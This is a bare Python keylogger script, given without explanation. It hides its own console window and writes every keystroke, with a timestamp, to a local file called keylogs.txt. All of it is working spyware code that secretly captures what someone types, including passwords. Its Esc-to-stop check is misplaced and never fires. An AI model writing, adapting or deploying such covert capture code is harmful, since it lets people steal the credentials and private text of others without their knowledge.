from pynput import keyboard
import datetime
import os
import win32gui
import win32console

window = win32console.GetConsoleWindow()
win32gui.ShowWindow(window, 0)

log_file = "keylogs.txt"

def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"{datetime.datetime.now()} - {key.char}\n")
        if key == keyboard.Key.esc:
            return False
    except AttributeError:
        with open(log_file, "a") as file:
            file.write(f"{datetime.datetime.now()} - {key}\n")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()